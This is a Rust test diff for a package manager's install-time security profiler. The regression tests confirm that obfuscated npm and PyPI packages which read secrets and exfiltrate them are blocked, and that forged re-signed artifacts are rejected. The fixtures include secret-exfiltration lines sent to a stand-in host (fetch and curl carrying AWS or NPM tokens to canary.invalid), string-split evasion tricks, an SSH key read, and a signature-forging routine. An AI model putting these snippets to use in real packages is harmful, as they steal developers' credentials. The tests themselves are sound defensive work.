+mod redteam_capability_evasion {
+    //! F1 REGRESSION SUITE — install-time profiler fails closed on obfuscation.
+    //!
+    //! THREAT: a malicious npm/PyPI package author. Previously the registry
+    //! profiler was a best-effort substring scanner: source that avoided the
+    //! literal trigger tokens (computed member access on capability roots,
+    //! string-built identifiers, indirect require, dynamic import/eval) profiled
+    //! as `Behavior::Pure` / `Verdict::Accepted` with ZERO capabilities, then ran
+    //! unsandboxed. The profiler now emits a `DynamicEval` capability for opaque
+    //! access to a capability ROOT, forcing deny-by-default. These tests assert
+    //! the SECURE behavior; the over-block guard ensures ordinary computed access
+    //! on plain local data stays Pure/Accepted.
+
+    use super::*;
+
+    fn profile_js(src: &str) -> CompileSourceReport {
+        profile_js_named("innocent-utils", src)
+    }
+
+    fn profile_js_named(name: &str, src: &str) -> CompileSourceReport {
+        let dir = tempfile::tempdir().unwrap();
+        let source = dir.path().join("source");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(source.join("index.js"), src).unwrap();
+        compile_source_path(CompileSourceOptions {
+            project_dir: dir.path().to_path_buf(),
+            source_path: source,
+            ecosystem: Ecosystem::Npm,
+            name: name.to_owned(),
+            version: "1.0.0".to_owned(),
+            allowed_capabilities: Vec::new(),
+            allowed_flows: Vec::new(),
+            write_artifact: false,
+        })
+        .unwrap()
+    }
+
+    fn profile_py(src: &str) -> CompileSourceReport {
+        let dir = tempfile::tempdir().unwrap();
+        let source = dir.path().join("source");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(source.join("mod.py"), src).unwrap();
+        compile_source_path(CompileSourceOptions {
+            project_dir: dir.path().to_path_buf(),
+            source_path: source,
+            ecosystem: Ecosystem::Pypi,
+            name: "innocent-pylib".to_owned(),
+            version: "1.0.0".to_owned(),
+            allowed_capabilities: Vec::new(),
+            allowed_flows: Vec::new(),
+            write_artifact: false,
+        })
+        .unwrap()
+    }
+
+    // Baseline: the literal form is still correctly detected.
+    #[test]
+    fn literal_exfil_is_blocked_baseline() {
+        let r = profile_js(
+            "const e = process.env.AWS_SECRET_ACCESS_KEY;\n             fetch('https://canary.invalid/c?k=' + e);\n",
+        );
+        assert_eq!(r.artifact.behavior, Behavior::HostCapability);
+        assert_eq!(r.artifact.verdict, Verdict::Blocked);
+    }
+
+    // FIXED: the string-split obfuscation that previously installed as
+    // Pure/Accepted now fails closed.
+    #[test]
+    fn obfuscated_exfil_is_blocked() {
+        let r = profile_js(
+            "const e = process['en'+'v']['AWS_SECRET_ACCESS_KEY'];\n             const send = globalThis['fet'+'ch'];\n             send('https://canary.invalid/c?k=' + e);\n",
+        );
+        assert_eq!(
+            r.artifact.behavior,
+            Behavior::HostCapability,
+            "obfuscated host access must not profile as Pure"
+        );
+        assert_eq!(
+            r.artifact.verdict,
+            Verdict::Blocked,
+            "obfuscated env->network exfil must not install as Accepted"
+        );
+        assert!(
+            r.artifact
+                .capabilities
+                .iter()
+                .any(|c| c.kind == CapabilityKind::DynamicEval),
+            "opaque capability-root access must emit a DynamicEval capability"
+        );
+    }
+
+    // Each individual opaque-dynamism vector fails closed (Blocked).
+    #[test]
+    fn opaque_capability_root_access_fails_closed() {
+        for src in [
+            // computed access on dangerous roots
+            "const x = process['en'+'v'];",
+            "const f = globalThis['fetch'];",
+            "const r = require['main'];",
+            "const cp = child_process['spawn'];",
+            "const g = global['process'];",
+            // indirect require
+            "const r = require; r('child_process');",
+            // dynamic import
+            "const m = import('./' + name);",
+            // new Function / eval constructor
+            "const f = new Function('return process.env');",
+            // string-built capability identifier
+            "const k = globalThis['fet'+'ch'];",
+        ] {
+            let r = profile_js(src);
+            assert_eq!(
+                r.artifact.verdict,
+                Verdict::Blocked,
+                "opaque source must fail closed: {src:?} -> caps {:?}",
+                r.artifact.capabilities
+            );
+        }
+    }
+
+    #[test]
+    fn opaque_python_dynamism_fails_closed() {
+        for src in [
+            "import importlib\nm = importlib.import_module(name)\n",
+            "m = __import__(name)\n",
+            "f = getattr(os, attr)\n",
+            "c = compile(src, '<s>', 'exec')\n",
+            "g = globals()['secret']\n",
+        ] {
+            let r = profile_py(src);
+            assert_eq!(
+                r.artifact.verdict,
+                Verdict::Blocked,
+                "opaque python source must fail closed: {src:?} -> caps {:?}",
+                r.artifact.capabilities
+            );
+        }
+    }
+
+    // OVER-BLOCK GUARD: ordinary computed access on PLAIN local objects/arrays
+    // and a literal project-file read must still profile Pure / Accepted.
+    #[test]
+    fn ordinary_computed_access_stays_pure() {
+        let r = profile_js(
+            "function pick(obj, keys) {\n\
+             const out = {};\n\
+             for (const k of keys) { out[k] = obj[k]; }\n\
+             const first = keys[0];\n\
+             const arr = [1, 2, 3];\n\
+             return out[first] + arr[1];\n\
+             }\n\
+             module.exports = pick;\n",
+        );
+        assert_eq!(
+            r.artifact.behavior,
+            Behavior::Pure,
+            "computed access on plain local objects/arrays must stay Pure; caps {:?}",
+            r.artifact.capabilities
+        );
+        assert_eq!(r.artifact.verdict, Verdict::Accepted);
+    }
+
+    #[test]
+    fn ordinary_python_getattr_on_self_stays_pure() {
+        let r = profile_py(
+            "def render(self, name):\n    value = getattr(self, name, None)\n    return value\n",
+        );
+        assert_eq!(
+            r.artifact.behavior,
+            Behavior::Pure,
+            "getattr on a plain local object must stay Pure; caps {:?}",
+            r.artifact.capabilities
+        );
+        assert_eq!(r.artifact.verdict, Verdict::Accepted);
+    }
 }
 
 #[cfg(test)]
@@ -20935,6 +21700,7 @@ packages:
             dir.path().join("omc.lock"),
             toml::to_string_pretty(&OmcLock {
                 version: 1,
+                signing_key: None,
                 packages: vec![locked.clone()],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -20968,6 +21734,7 @@ packages:
             dir.path().join("omc.lock"),
             toml::to_string_pretty(&OmcLock {
                 version: 1,
+                signing_key: None,
                 packages: vec![locked],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -21048,6 +21815,7 @@ packages:
             dir.path().join("omc.lock"),
             toml::to_string_pretty(&OmcLock {
                 version: 1,
+                signing_key: None,
                 packages: vec![keep.clone(), stale],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -21077,6 +21845,7 @@ packages:
             dir.path().join("omc.lock"),
             toml::to_string_pretty(&OmcLock {
                 version: 1,
+                signing_key: None,
                 packages: vec![
                     keep_npm.clone(),
                     stale_npm,
@@ -21122,6 +21891,7 @@ packages:
             dir.path().join("omc.lock"),
             toml::to_string_pretty(&OmcLock {
                 version: 1,
+                signing_key: None,
                 packages: vec![keep, remove],
                 local_sources: Vec::new(),
                 python_vcs: vec![LockedPythonVcsDependency {
@@ -21157,6 +21927,7 @@ packages:
             dir.path().join("omc.lock"),
             toml::to_string_pretty(&OmcLock {
                 version: 1,
+                signing_key: None,
                 packages: Vec::new(),
                 local_sources: Vec::new(),
                 python_vcs: vec![LockedPythonVcsDependency {
@@ -21191,6 +21962,7 @@ packages:
         let dep = locked_package_for_test(Ecosystem::Pypi, "dep", "1.5.0");
         let lock = OmcLock {
             version: 1,
+            signing_key: None,
             packages: vec![root, dep],
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -21219,6 +21991,7 @@ packages:
         let dep = locked_package_for_test(Ecosystem::Pypi, "dep", "1.5.0");
         let lock = OmcLock {
             version: 1,
+            signing_key: None,
             packages: vec![root, dep],
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -21385,6 +22158,7 @@ packages:
         let dependency = locked_package_for_test(Ecosystem::Npm, "is-number", "6.0.0");
         let lock = OmcLock {
             version: 1,
+            signing_key: None,
             packages: vec![root, dependency],
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -21408,6 +22182,7 @@ packages:
         let dependency = locked_package_for_test(Ecosystem::Pypi, "idna", "3.7");
         let lock = OmcLock {
             version: 1,
+            signing_key: None,
             packages: vec![root, dependency],
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -21432,6 +22207,7 @@ packages:
         root.optional_dependencies = vec!["npm:optional-platform@1.0.0".to_owned()];
         let lock = OmcLock {
             version: 1,
+            signing_key: None,
             packages: vec![root],
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -21461,6 +22237,7 @@ packages:
         let peer = locked_package_for_test(Ecosystem::Npm, "peer-runtime", "1.0.0");
         let lock = OmcLock {
             version: 1,
+            signing_key: None,
             packages: vec![root, runtime, optional, peer],
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -21486,6 +22263,7 @@ packages:
     fn locked_reachable_packages_reject_stale_lockfiles() {
         let lock = OmcLock {
             version: 1,
+            signing_key: None,
             packages: vec![locked_package_for_test(Ecosystem::Npm, "left-pad", "1.1.0")],
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -22013,12 +22791,13 @@ print("hi")
         package.source_url = "https://example.invalid/pure-sdist-1.0.0.tar.gz".to_owned();
         package.archive = relative_path(dir.path(), &archive);
         package.sha256 = sha256_hex(&bytes);
-        write_signed_artifact_for_test(dir.path(), &package);
+        package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);
 
         let report = install_lock(
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -22071,7 +22850,7 @@ print("hi")
         package.source_url = "https://example.invalid/pure-target-1.0.0.tar.gz".to_owned();
         package.archive = relative_path(dir.path(), &archive);
         package.sha256 = sha256_hex(&bytes);
-        write_signed_artifact_for_test(dir.path(), &package);
+        package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);
 
         let target = dir.path().join("vendor");
         fs::create_dir_all(&target).unwrap();
@@ -22081,6 +22860,7 @@ print("hi")
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -22142,20 +22922,21 @@ print("hi")
             "https://example.invalid/wheel_stale_pkg-1.0.0-py3-none-any.whl".to_owned();
         old_package.archive = relative_path(dir.path(), &old_archive);
         old_package.sha256 = sha256_hex(&old_wheel);
-        write_signed_artifact_for_test(dir.path(), &old_package);
+        old_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &old_package);
 
         let mut new_package = locked_package_for_test(Ecosystem::Pypi, "wheel-stale-pkg", "1.1.0");
         new_package.source_url =
             "https://example.invalid/wheel_stale_pkg-1.1.0-py3-none-any.whl".to_owned();
         new_package.archive = relative_path(dir.path(), &new_archive);
         new_package.sha256 = sha256_hex(&new_wheel);
-        write_signed_artifact_for_test(dir.path(), &new_package);
+        new_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &new_package);
 
         let target = dir.path().join("vendor");
         install_lock_with_python_target(
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![old_package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -22169,6 +22950,7 @@ print("hi")
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![new_package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -22234,20 +23016,21 @@ print("hi")
             "https://example.invalid/script_stale_pkg-1.0.0-py3-none-any.whl".to_owned();
         old_package.archive = relative_path(dir.path(), &old_archive);
         old_package.sha256 = sha256_hex(&old_wheel);
-        write_signed_artifact_for_test(dir.path(), &old_package);
+        old_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &old_package);
 
         let mut new_package = locked_package_for_test(Ecosystem::Pypi, "script-stale-pkg", "1.1.0");
         new_package.source_url =
             "https://example.invalid/script_stale_pkg-1.1.0-py3-none-any.whl".to_owned();
         new_package.archive = relative_path(dir.path(), &new_archive);
         new_package.sha256 = sha256_hex(&new_wheel);
-        write_signed_artifact_for_test(dir.path(), &new_package);
+        new_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &new_package);
 
         let target = dir.path().join("vendor");
         let report = install_lock_with_python_target(
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![old_package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -22264,6 +23047,7 @@ print("hi")
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![new_package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -22315,12 +23099,13 @@ print("hi")
         package.source_url = "https://example.invalid/pure-sdist-1.0.0.zip".to_owned();
         package.archive = relative_path(dir.path(), &archive);
         package.sha256 = sha256_hex(&bytes);
-        write_signed_artifact_for_test(dir.path(), &package);
+        package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);
 
         let report = install_lock(
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -25500,16 +26285,18 @@ wheels = [
             .iter()
             .filter(|finding| finding.kind == CapabilityKind::DynamicEval)
             .collect::<Vec<_>>();
-        assert_eq!(dynamic_eval_findings.len(), 2);
-        assert!(dynamic_eval_findings
+        // Real dynamic eval is flagged on runtime.js (eval / new Function) and
+        // tool.py (exec); the regex `.exec` on coerce.js is NOT. (runtime.js may
+        // contribute more than one finding now that `new Function` is detected
+        // distinctly from `eval`, so assert by source-file presence.)
+        let sources: BTreeSet<&str> = dynamic_eval_findings
             .iter()
-            .any(|finding| finding.source == "package/runtime.js"));
-        assert!(dynamic_eval_findings
-            .iter()
-            .any(|finding| finding.source == "package/tool.py"));
-        assert!(!dynamic_eval_findings
-            .iter()
-            .any(|finding| finding.source == "package/functions/coerce.js"));
+            .map(|finding| finding.source.as_str())
+            .collect();
+        assert_eq!(
+            sources,
+            BTreeSet::from(["package/runtime.js", "package/tool.py"])
+        );
     }
 
     #[test]
@@ -25557,6 +26344,107 @@ wheels = [
             .iter()
             .any(|finding| finding.source == "package/cache.py"
                 && finding.kind == CapabilityKind::FsWrite));
+    }
+
+    // F4: a literal file-read path is captured as the FsRead target (not "*").
+    #[test]
+    fn profiler_captures_literal_fs_read_path() {
+        let mut profiler = SourceProfiler::default();
+        profiler.scan_file(
+            "lib/secrets.js",
+            "const k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
+        );
+        let profile = profiler.finish();
+        assert!(
+            profile
+                .capabilities
+                .iter()
+                .any(|finding| finding.kind == CapabilityKind::FsRead
+                    && finding.target == "/home/victim/.ssh/id_rsa"),
+            "literal read path must be captured: {:?}",
+            profile.capabilities
+        );
+    }
+
+    // F4: reading a sensitive file is Blocked at verdict time even under a
+    // wildcard fs.read:* grant (mirrors the in-cell sensitive-read guarantee).
+    #[test]
+    fn sensitive_literal_read_blocked_under_wildcard_grant() {
+        let dir = tempfile::tempdir().unwrap();
+        let source = dir.path().join("source");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(
+            source.join("index.js"),
+            "const fs = require('fs');\nconst k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
+        )
+        .unwrap();
+        let report = compile_source_path(CompileSourceOptions {
+            project_dir: dir.path().to_path_buf(),
+            source_path: source,
+            ecosystem: Ecosystem::Npm,
+            name: "reader".to_owned(),
+            version: "1.0.0".to_owned(),
+            // Wildcard fs.read grant must NOT cover sensitive files.
+            allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
+            allowed_flows: Vec::new(),
+            write_artifact: false,
+        })
+        .unwrap();
+        assert_eq!(
+            report.artifact.verdict,
+            Verdict::Blocked,
+            "reading ~/.ssh/id_rsa must be blocked even under fs.read:*"
+        );
+    }
+
+    // F4 over-block guard: a literal read of an ordinary project file IS allowed
+    // under a wildcard fs.read:* grant.
+    #[test]
+    fn ordinary_literal_read_allowed_under_wildcard_grant() {
+        let dir = tempfile::tempdir().unwrap();
+        let source = dir.path().join("source");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(
+            source.join("index.js"),
+            "const fs = require('fs');\nconst c = fs.readFileSync('./config.json');\n",
+        )
+        .unwrap();
+        let report = compile_source_path(CompileSourceOptions {
+            project_dir: dir.path().to_path_buf(),
+            source_path: source,
+            ecosystem: Ecosystem::Npm,
+            name: "reader".to_owned(),
+            version: "1.0.0".to_owned(),
+            allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
+            allowed_flows: Vec::new(),
+            write_artifact: false,
+        })
+        .unwrap();
+        assert_eq!(
+            report.artifact.verdict,
+            Verdict::Accepted,
+            "an ordinary literal project-file read must remain accepted under fs.read:*"
+        );
+    }
+
+    // F5: Python startup hooks are never copied into site-packages.
+    #[test]
+    fn python_startup_hooks_are_not_installed() {
+        for hook in [
+            "evil.pth",
+            "sitecustomize.py",
+            "usercustomize.py",
+            "pkg/sub/inject.pth",
+        ] {
+            assert!(
+                !should_copy_python_sdist_path(Path::new(hook)),
+                "{hook} must not be copied into site-packages"
+            );
+            assert!(is_python_startup_hook_path(Path::new(hook)), "{hook}");
+        }
+        // ordinary modules still copy
+        assert!(should_copy_python_sdist_path(Path::new("pkg/__init__.py")));
+        assert!(should_copy_python_sdist_path(Path::new("pkg/site.py")));
     }
 
     #[test]
@@ -25623,7 +26511,11 @@ wheels = [
             .filter(|op| matches!(op, Op::Cap(_)))
             .count();
 
-        assert_eq!(cap_ops, 3);
+        // Findings dedup by (kind, target) to 3 unique caps: EnvRead(NPM_TOKEN),
+        // FsRead(*), HttpRequest(evil.example). The F2 flow model then emits one
+        // `push source; consume in sink` pair per (source x sink) = 2 sources x
+        // 1 sink = 2 pairs = 4 cap ops (env->http and fs-read->http both modeled).
+        assert_eq!(cap_ops, 4);
     }
 
     #[test]
@@ -28530,6 +29422,139 @@ wheels = [
         ));
     }
 
+    // F2 REGRESSION (was a CONFIRMED bypass, now FIXED): `module_from_profile`
+    // now models a tainted data flow from EVERY sensitive source (env/file read)
+    // to EVERY sink (network, process, fs write, dynamic eval), so the install
+    // verdict rejects secret->non-http exfil just as it does secret->http.
+    // Previously only env->http was wired; env->proc, fs-read->net, env->eval and
+    // env->fs-write were silently Accepted. A covering flow grant still admits
+    // the flow (so legitimate, explicitly-authorised tools are not over-blocked).
+    #[test]
+    fn redteam_secret_to_every_sink_blocked_at_verdict() {
+        let package = ResolvedPackage {
+            ecosystem: Ecosystem::Npm,
+            name: "redteam".to_owned(),
+            version: "1.0.0".to_owned(),
+            source_url: "https://example.invalid/redteam.tgz".to_owned(),
+            download_url: None,
+            local_path: None,
+            filename: "redteam.tgz".to_owned(),
+            expected_sha256: None,
+            expected_sha1: None,
+            expected_integrity: None,
+            npm_direct_tarball: false,
+            pypi_direct_wheel: false,
+            npm_scripts: BTreeMap::new(),
+            platform_compatible: true,
+            dependencies: Vec::new(),
+        };
+
+        let env = || CapabilityFinding {
+            kind: CapabilityKind::EnvRead,
+            target: "NPM_TOKEN".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "process.env".to_owned(),
+        };
+        let fs_read = || CapabilityFinding {
+            kind: CapabilityKind::FsRead,
+            target: "config.json".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "fs.readFileSync".to_owned(),
+        };
+        let http = || CapabilityFinding {
+            kind: CapabilityKind::HttpRequest,
+            target: "evil.example".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "fetch(...)".to_owned(),
+        };
+        let proc = || CapabilityFinding {
+            kind: CapabilityKind::ProcSpawn,
+            target: "*".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "child_process.spawn".to_owned(),
+        };
+        let fs_write = || CapabilityFinding {
+            kind: CapabilityKind::FsWrite,
+            target: "*".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "fs.writeFileSync".to_owned(),
+        };
+        let eval = || CapabilityFinding {
+            kind: CapabilityKind::DynamicEval,
+            target: "*".to_owned(),
+            source: "index.js".to_owned(),
+            evidence: "eval".to_owned(),
+        };
+
+        // A policy that grants every capability used below, but NO flow rules:
+        // so the only thing standing between source and sink is the flow check.
+        let caps_only = Policy::pure()
+            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
+            .allow_capability(Capability::FsRead("config.json".to_owned()))
+            .allow_capability(Capability::HttpHost("evil.example".to_owned()))
+            .allow_capability(Capability::ProcSpawn("*".to_owned()))
+            .allow_capability(Capability::FsWrite("*".to_owned()))
+            .allow_capability(Capability::DynamicEval);
+
+        // Every (sensitive source -> sink) pair is now BLOCKED without a flow grant.
+        for (label, caps) in [
+            ("env -> http", vec![env(), http()]),
+            ("fs-read -> http", vec![fs_read(), http()]),
+            ("env -> process", vec![env(), proc()]),
+            ("env -> fs-write", vec![env(), fs_write()]),
+            ("env -> eval", vec![env(), eval()]),
+            ("fs-read -> process", vec![fs_read(), proc()]),
+        ] {
+            assert!(
+                verify_module(&module_from_profile(&package, &caps), &caps_only).is_err(),
+                "{label} secret exfil must be blocked at verdict time without a flow grant"
+            );
+        }
+
+        // A covering flow grant (env:NPM_TOKEN -> process) admits the env->proc
+        // flow: we must not over-block an explicitly authorised tool.
+        let proc_flow = caps_only.clone().allow_flow(
+            LabelMatcher::Env("NPM_TOKEN".to_owned()),
+            Sink::Process("*".to_owned()),
+        );
+        assert!(
+            verify_module(&module_from_profile(&package, &[env(), proc()]), &proc_flow).is_ok(),
+            "env->process must be admitted when a covering flow grant is present"
+        );
+
+        // End-to-end witness: a PLAIN env->curl exfil now profiles to BLOCKED even
+        // when the victim grants env:NPM_TOKEN + proc.spawn:* (the build-tool caps).
+        let dir = tempfile::tempdir().unwrap();
+        let source = dir.path().join("source");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(
+            source.join("index.js"),
+            "const t = process.env.NPM_TOKEN;\n\
+             const cp = require('child_process');\n\
+             cp.spawn('curl', ['-d', t, 'https://canary.invalid/c']);\n",
+        )
+        .unwrap();
+        let report = compile_source_path(CompileSourceOptions {
+            project_dir: dir.path().to_path_buf(),
+            source_path: source,
+            ecosystem: Ecosystem::Npm,
+            name: "buildtool".to_owned(),
+            version: "1.0.0".to_owned(),
+            allowed_capabilities: vec![
+                Capability::EnvRead("NPM_TOKEN".to_owned()),
+                Capability::ProcSpawn("*".to_owned()),
+            ],
+            allowed_flows: Vec::new(),
+            write_artifact: false,
+        })
+        .unwrap();
+        assert_eq!(
+            report.artifact.verdict,
+            Verdict::Blocked,
+            "plain env->curl exfil must now be Blocked without a covering flow grant"
+        );
+    }
+
     #[test]
     fn signs_and_verifies_artifact_payloads() {
         let dir = tempfile::tempdir().unwrap();
@@ -28603,7 +29628,7 @@ wheels = [
         let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
         package.archive = relative_path(dir.path(), &archive);
         package.sha256 = sha256_hex(&bytes);
-        write_signed_artifact_for_test(dir.path(), &package);
+        package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);
 
         let artifact_path = dir.path().join(&package.artifact);
         let mut artifact =
@@ -28620,6 +29645,7 @@ wheels = [
             dir.path(),
             &OmcLock {
                 version: 1,
+                signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
                 packages: vec![package],
                 local_sources: Vec::new(),
                 python_vcs: Vec::new(),
@@ -28628,6 +29654,145 @@ wheels = [
         .unwrap_err();
 
         assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));
+    }
+
+    // RED TEAM TRIPWIRE (CONFIRMED BYPASS): the artifact signature is
+    // self-attesting. `verify_artifact_signature` reads the public key out of
+    // the artifact's own `signature.public_key` field and verifies against it.
+    // There is no trust anchor: nothing checks that this key is the project's
+    // signing key (.omc/keys/artifact-ed25519.key) or any pinned/known key.
+    //
+    // Threat model: the attacker is a malicious dependency author who can
+    // influence the on-disk .omc/artifacts/*.json + omc.lock that the victim
+    // runs `omc install --locked` / `ci` against (e.g. a poisoned cache shipped
+    // in a repo, a compromised mirror, or a malicious transitive dep that wrote
+    // its own artifact). The attacker does NOT have the victim's signing key.
+    //
+    // This test re-signs a TAMPERED artifact (verdict Blocked -> Accepted, a
+    // dangerous grant + capability stripped, source bytes swapped) with a FRESH
+    // attacker-generated ed25519 key, then syncs the lock entry to match. Both
+    // `verify_artifact_signature` AND the full `install_lock` path ACCEPT it.
+    // If a trust anchor is ever added, this test must start failing (then it
+    // should be converted to assert rejection).
+    fn attacker_resign(artifact: &mut OmcArtifact) {
+        // Simulate an attacker who does not possess the victim's project key.
+        artifact.signature = None;
+        let payload = serde_json::to_vec(artifact).unwrap();
+        let attacker_key = SigningKey::generate(&mut OsRng);
+        let verifying_key = attacker_key.verifying_key();
+        let signature = attacker_key.sign(&payload);
+        let public_key = verifying_key.to_bytes();
+        artifact.signature = Some(ArtifactSignature {
+            algorithm: "ed25519".to_owned(),
+            key_id: sha256_hex(&public_key)[..16].to_owned(),
+            public_key: STANDARD.encode(public_key),
+            payload_sha256: sha256_hex(&payload),
+            signature: STANDARD.encode(signature.to_bytes()),
+        });
+    }
+
+    // F3 REGRESSION (was a CONFIRMED bypass, now FIXED): an attacker who tampers
+    // a cached artifact (Blocked -> Accepted, dangerous grant stripped) and
+    // re-signs it with their OWN key is REJECTED by the locked-install path. The
+    // lock pins the project's signing public key (`signing-key`) and each
+    // artifact's payload hash (`artifact-sha256`); the forged artifact matches
+    // neither, so the trust anchor fails closed.
+    #[test]
+    fn redteam_attacker_resigned_artifact_is_rejected() {
+        let dir = tempfile::tempdir().unwrap();
+        let bytes = npm_tgz_for_test(
+            r#"{
+                "name": "evil",
+                "version": "1.0.0"
+            }"#,
+        );
+        let archive = dir.path().join(".omc/cache/npm/evil.tgz");
+        fs::create_dir_all(archive.parent().unwrap()).unwrap();
+        fs::write(&archive, &bytes).unwrap();
+
+        // 1) Start from a legitimately-signed lock for a BLOCKED package carrying
+        //    a dangerous grant. `signed_lock_for_test` pins the project key and
+        //    the genuine artifact payload hash.
+        let mut package = locked_package_for_test(Ecosystem::Npm, "evil", "1.0.0");
+        package.archive = relative_path(dir.path(), &archive);
+        package.sha256 = sha256_hex(&bytes);
+        package.verdict = Verdict::Blocked;
+        package.behavior = Behavior::Pure;
+        package.grants = vec!["env.read:*".to_owned()];
+        let mut lock = signed_lock_for_test(dir.path(), vec![package.clone()]);
+
+        // 2) ATTACKER tampers the cached artifact: flip the verdict to Accepted
+        //    and strip the dangerous grant so the install gate would be satisfied.
+        let artifact_path = dir.path().join(&package.artifact);
+        let mut artifact =
+            serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path).unwrap())
+                .unwrap();
+        artifact.verdict = Verdict::Accepted;
+        artifact.grants = Vec::new();
+
+        // 3) ATTACKER re-signs with their OWN key (no victim key needed). The
+        //    forged signature is still self-consistent...
+        attacker_resign(&mut artifact);
+        verify_artifact_signature(&artifact)
+            .expect("self-consistent forged signature still verifies in isolation");
+        fs::write(
+            &artifact_path,
+            serde_json::to_string_pretty(&artifact).unwrap(),
+        )
+        .unwrap();
+
+        // 4) ATTACKER syncs the lock entry to match the tampered artifact.
+        lock.packages[0].verdict = Verdict::Accepted;
+        lock.packages[0].grants = Vec::new();
+
+        // 5) `omc install --locked` now REJECTS it: the artifact's embedded key
+        //    is not the pinned project key (and its payload hash no longer
+        //    matches the pinned `artifact-sha256`).
+        let error = install_lock(dir.path(), &lock)
+            .expect_err("attacker-resigned artifact must be rejected by the F3 trust anchor");
+        assert!(
+            matches!(
+                error,
+                OmcRegistryError::UnsupportedInstallArtifact(_)
+                    | OmcRegistryError::DigestMismatch { .. }
+            ),
+            "expected trust-anchor rejection, got {error:?}"
+        );
+        assert!(
+            !dir.path().join("node_modules/evil").exists(),
+            "the tampered package must not be installed"
+        );
+    }
+
+    // F3 REGRESSION: a pre-F3 lock with no pinned `signing-key` is treated as
+    // untrusted on the locked-install path and must be re-locked.
+    #[test]
+    fn locked_install_requires_pinned_signing_key() {
+        let dir = tempfile::tempdir().unwrap();
+        let bytes = npm_tgz_for_test(r#"{ "name": "pkg", "version": "1.0.0" }"#);
+        let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
+        fs::create_dir_all(archive.parent().unwrap()).unwrap();
+        fs::write(&archive, &bytes).unwrap();
+
+        let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
+        package.archive = relative_path(dir.path(), &archive);
+        package.sha256 = sha256_hex(&bytes);
+        package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);
+
+        // Lock omits `signing-key` (pre-F3 / attacker-stripped).
+        let lock = OmcLock {
+            version: 1,
+            signing_key: None,
+            packages: vec![package],
+            local_sources: Vec::new(),
+            python_vcs: Vec::new(),
+        };
+        let error = install_lock(dir.path(), &lock)
+            .expect_err("a lock without a pinned signing key must not be trusted");
+        assert!(matches!(
+            error,
+            OmcRegistryError::UnsupportedInstallArtifact(_)
+        ));
     }
 
     fn npm_tgz_for_test(package_json: &str) -> Vec<u8> {
@@ -28814,6 +29979,7 @@ wheels = [
             archive: format!(".omc/cache/{name}-{version}.tgz"),
             artifact: format!(".omc/artifacts/{name}-{version}/omc.json"),
             sha256: "0".repeat(64),
+            artifact_sha256: String::new(),
             behavior: Behavior::Pure,
             verdict: Verdict::Accepted,
             dependencies: Vec::new(),
@@ -28825,7 +29991,11 @@ wheels = [
         }
     }
 
-    fn write_signed_artifact_for_test(project_dir: &Path, package: &LockedPackage) {
+    /// Sign + write the artifact for `package`, returning the payload sha256
+    /// (the F3 `artifact-sha256` pin). The project signing key is created on
+    /// first call; callers pin it into the lock via `project_signing_public_key`
+    /// or `ensure_lock_signing_key`.
+    fn write_signed_artifact_for_test(project_dir: &Path, package: &LockedPackage) -> String {
